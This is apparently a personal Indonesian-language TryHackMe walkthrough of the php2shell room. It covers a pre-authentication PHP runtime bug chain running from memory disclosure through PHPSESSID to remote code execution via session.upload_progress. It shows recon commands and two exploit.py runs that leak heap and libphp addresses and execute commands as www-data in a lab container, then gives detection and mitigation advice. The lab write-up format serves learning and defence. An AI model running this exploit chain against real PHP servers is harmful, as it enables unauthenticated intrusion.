# TryHackMe — php2shell Walkthrough

> php2shell itu chain vulnerability di **runtime PHP** yang ujung-ujungnya bisa bocorin memory sampe remote code execution (RCE). Beda sama bug level aplikasi kayak SQL injection, ini bug-nya nempel di logic internal PHP sendiri — soal gimana dia parsing request dan ngatur memory.

Room ini ngebahas 2 kerentanan:

- **CVE-2026-109618** — Memory disclosure
- **CVE-2026-109619** — Remote code execution

Serunya, seluruh exploit-nya dijalanin **tanpa login, tanpa autentikasi** — cuma modal HTTP request biasa ke endpoint yang nerima POST.

---

## TL;DR

Target cuma punya satu file PHP:

```php
<?php echo "OK\n"; ?>
```

Tapi dari satu baris kode itu doang, kita bisa:
1. Crash worker PHP-FPM
2. Bocorin alamat memory heap
3. Bocorin base address `libphp` buat ngalahin ASLR
4. Forge struktur HashTable palsu di memory
5. Arahin function pointer-nya ke `system()`
6. Dapet command execution sebagai `www-data`

---

## 1. Gimana Cara Kerjanya (High Level)

Fitur `session.upload_progress` di PHP dirancang buat nge-track progress upload file. Masalahnya, PHP bisa memproses data upload-progress itu **sebelum** script aplikasi kamu sempat jalan sama sekali.

Menurut materi room-nya: kondisi *out-of-memory* bisa memicu *bailout* lewat `longjmp()`. Kalau bailout ini motong proses di tengah jalan — pas state internal PHP lagi gak konsisten — ada pointer yang bisa tetep nunjuk ke memory yang udah di-*free*.

![Upload progress runs before your code does](images/01-upload-progress-flow.jpg)

Alur singkatnya: **Parse body** (upload-progress nulis ke `$_SESSION`) → **RINIT** (request start-up, SAPI callback) → **Run script** (`index.php` baru dieksekusi). Attacker udah "nyampe" di titik RINIT, pre-auth — gak perlu `session_start()`, gak perlu login, gak perlu kode aplikasi apapun. Endpoint manapun yang nerima POST bisa dipakai.

---

## 2. Lab Reconnaissance

Pertama, cek container Docker yang jalan dan versi PHP-nya:

```bash
ubuntu@tryhackme-2404:~$ docker ps
CONTAINER ID   IMAGE              COMMAND                  CREATED      STATUS         PORTS                    NAMES
d77a04a7d860   php:8.4.26-apache  "docker-php-entrypoi…"   10 days ago  Up 23 minutes  127.0.0.1:8088->80/tcp   php2shell-target

ubuntu@tryhackme-2404:~$ docker exec php2shell-target php -v
PHP 8.4.26 (cli) (built: Oct 21 2026 00:31:19) (NTS)
Copyright (c) The PHP Group
Zend Engine v4.4.26, Copyright (c), by Zend Technologies
    with Zend OPcache v8.4.26, Copyright (c), by Zend Technologies
```

![Recon: docker ps dan php -v di target](images/05-docker-ps-recon.jpg)

`php2shell-target` itu nama container Docker yang ngejalanin server PHP yang vulnerable di lab TryHackMe-nya.

Terus, dicek juga endpoint web-nya dan source code-nya:

```bash
ubuntu@tryhackme-2404:~$ curl -s http://127.0.0.1:8088/index.php
OK
ubuntu@tryhackme-2404:~$ docker exec php2shell-target cat /var/www/html/index.php
<?php echo "OK\n"; ?>
```

Aplikasinya cuma punya satu statement doang yang nge-print `OK`. Ini nunjukin kalau vulnerability yang dibahas di room ini emang ada di **runtime PHP**, bukan di kode aplikasinya sendiri.

---

## 3. Root Cause: Bailout dan Dangling Pointer

Sebelum masuk ke exploit-nya, ada beberapa istilah yang perlu dipahami dulu:

- **Bailout** — mekanisme darurat PHP buat "kabur" dari kondisi fatal tertentu.
- **Dangling pointer** — pointer yang masih nunjuk ke suatu memory, padahal memory itu udah di-*free*.
- **Memory disclosure** — kondisi di mana aplikasi/proses ngebocorin data dari memory-nya.
- **ASLR** — *Address Space Layout Randomization*, teknik yang bikin lokasi memory susah ditebak.
- **RCE** — *Remote Code Execution*, attacker bisa jalanin command dengan privilege proses yang kena.

Room ini nyebut `session.upload_progress` sebagai fitur yang ngasih **entry point** buat serangan. Fitur itu sendiri bukan vulnerability-nya — dia cuma jalan masuknya.

### Analogi Sederhana: Kursi yang Dipakai Ulang

Bayangin ada ruangan dengan kursi yang ditandain buat **User 1**. User 1 pergi, kursinya diambil/dipindah, tapi daftar denah tempat duduk masih nunjukin posisi kursi lama itu.

Abis itu, **User 2** dateng dan ditempatin di posisi yang sama (ruang yang sama dipake ulang). Tapi denah lama itu gak pernah di-update.

Kalau ada orang yang masih ngikutin denah lama, dia bakal nyasar ke posisi User 2 — padahal dia kira itu masih posisi User 1.

![A memory bailout skips the cleanup](images/03-memory-bailout.jpg)

Nah, ini mirip banget sama dangling pointer: memory-nya udah di-*free* dan dipake ulang, tapi ada pointer lama yang masih nunjuk ke alamat lama itu.

Di lab php2shell, urutannya kira-kira begini:

1. **Request 1** memicu kondisi out-of-memory bailout yang dijelasin tadi.
2. State internal PHP jadi gak konsisten.
3. Memory yang udah di-*free* itu bisa dipakai ulang.
4. **Request 2** nyampe ke worker yang sama, dan nemuin state yang udah "basi" itu.
5. Exploit-nya manfaatin kondisi ini buat memory disclosure, dan ujungnya buat RCE.

Worker process itu penting di sini karena dia bisa nanganin banyak request selama hidupnya. Kalau state yang korup bertahan setelah request pertama, request berikutnya yang kebetulan nyasar ke worker yang sama bisa ikut kena dampaknya.

> Catatan: analogi ini buat ngejelasin stale memory antar-request. Reverse shell itu beda — itu shell command yang connect balik ke operator. Dangling pointer doang gak otomatis bikin reverse shell.

---

## 4. Memory Disclosure — CVE-2026-109618

Room-nya ngejelasin gimana pointer session-identifier yang "basi" itu bisa salah ditangani, sampe bikin memory proses di sebelahnya kebocor lewat header response HTTP:

```
Set-Cookie: PHPSESSID
```

![The cookie header hands back the server's memory](images/04-cookie-oob-read.jpg)

Normalnya, header ini cuma isi session identifier. Tapi di vulnerability yang dijelasin room ini, PHP ceritanya baca lebih jauh dari identifier yang sah, dan jadi ngebocorin memory proses tambahan.

Exploit-nya nyoba balikin dua alamat:

- **Base address heap chunk**
- **Base address library PHP (`libphp`)**

Dua alamat ini bantu ngurangin efektivitas ASLR, karena sekarang keliatan di mana region memory yang relevan itu ditempatin.

---

## 5. Remote Code Execution — CVE-2026-109619

Room-nya ngejelasin stage kedua sebagai korupsi struktur internal PHP yang berhubungan sama HashTable. Pas proses cleanup, engine-nya bisa ngikutin function pointer yang gak seharusnya, bukan rutin cleanup yang asli.

![Four requests turn a crash into a shell](images/02-four-requests-chain.jpg)

Exploit-nya pake alamat-alamat memory yang udah didapet sebelumnya buat nyoba command execution. Script `exploit.py` ngejalanin seluruh tahap ini otomatis lewat HTTP murni:

```bash
ubuntu@tryhackme-2404:~/php2shell-bypass-aslr-exp$ python3 exploit.py -u http://127.0.0.1:8088/index.php -c 'id>/out/p1'
[*] target http://127.0.0.1:8088/index.php (cmd='id'>out/p1')
[*] offsets loaded from /home/ubuntu/php2shell-bypass-aslr-exp/out/offsets.env
[*] offsets: zif=0x465370 dtor=0x65eb60 htdata=0x690d8
[*] rotating worker over HTTP
[*] stage 1: heap leak (attempt 1/3)
[+] chunk base = 0x7ecc1ee00000
[*] rotating worker over HTTP
[*] stage 2: libphp leak (attempt 1/3)
[+] libphp base = 0x7ecc20a2e000
[*] rotating worker over HTTP
[*] stage 3: HTDATA=0x7ecc1ee690d8 ZIF=0x7ecc20e93370
[+] W3 attempt 1
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![Exploit jalan, proof uid=33(www-data) muncul](images/06-exploit-run-proof.jpg)

Ini konfirmasi command execution sebagai `www-data`, akun web server-nya. Dari titik ini, attacker secara teori bisa jalanin command lain lewat RCE ini.

```bash
ubuntu@tryhackme-2404:~$ curl -s http://127.0.0.1:8088/index.php
OK
ubuntu@tryhackme-2404:~$ ls ~/php2shell-bypass-aslr-exp
ASLR_PATHS.md  ASLR_PURE_HTTP_RESEARCH.md  HTTP_HEAP_LEAK.md  NOTES.md  NO_DISPLAY_ERRORS.md  docker  exploit.py  logs  readme.md
ASLR_PURE_HTTP.md  DISPLAY_ERRORS_OFF.md  NOASLR_REPORT.md  NOTES_BG.md  README.md  out  src
```

![curl index.php cuma balikin OK, isi exploit folder lumayan rame](images/07-curl-ls-files.jpg)

---

## 6. Flag

Setelah command execution kebukti jalan, tinggal pake command yang disediain room buat ambil flag-nya:

```bash
ubuntu@tryhackme-2404:~/php2shell-bypass-aslr-exp$ python3 exploit.py -u http://127.0.0.1:8088/index.php -c 'cat /f>/out/p1' --proof-file out/p1
[*] target http://127.0.0.1:8088/index.php (cmd='cat /f>/out/p1')
[*] offsets loaded from /home/ubuntu/php2shell-bypass-aslr-exp/out/offsets.env
[*] offsets: zif=0x465370 dtor=0x65eb60 htdata=0x690d8
[*] rotating worker over HTTP
[*] stage 1: heap leak (attempt 1/3)
[+] chunk base = 0x7ecc1ee00000
[*] rotating worker over HTTP
[*] stage 2: libphp leak (attempt 1/3)
[+] libphp base = 0x7ecc20a2e000
[*] rotating worker over HTTP
[*] stage 3: HTDATA=0x7ecc1ee690d8 ZIF=0x7ecc20e93370
[+] W3 attempt 1
PROOF: THM{......}
```

![Flag akhirnya nongol, format THM{...}](images/08-flag-proof.jpg)

> Flag-nya bakal muncul dengan format `THM{...}`. Di screenshot aslinya flag-nya aku blur — ganti sama flag punya kamu sendiri sebelum di-publish.

---

## 7. Detection dan Mitigasi

**Detection:** Perhatiin cookie `PHPSESSID` yang ukurannya gak wajar gede, request `POST` multipart yang mencurigakan, error memory PHP, dan worker yang crash gak kayak biasanya.

**Mitigasi:**

- **Update PHP** ke versi yang udah di-fix. Untuk PHP 8.4, lab ini nyebut **8.4.27** sebagai fixed release — tapi tetep cek security advisory resminya dulu sebelum patch sistem produksi beneran.
- **Rebuild container** dan restart semua worker PHP-FPM.
- Kalau fitur `upload_progress` emang gak kepake, mending **dimatiin aja**:

```ini
session.upload_progress.enabled = 0
```

> ⚠️ Verifikasi dulu ke security advisory resmi sebelum patch sistem produksi — nomor versi "fixed" di atas konteksnya lab TryHackMe, bukan jaminan buat semua environment.

---

## Key Takeaway

php2shell nunjukin gimana satu bug memory di runtime PHP bisa berujung ke **memory disclosure** sekaligus **remote code execution** — tanpa butuh satu baris kode aplikasi yang "vulnerable". Patch-nya ada di level engine, bukan di level aplikasi.

---

*Ditulis berdasarkan catatan & screenshot pribadi pas ngerjain room php2shell di TryHackMe.*
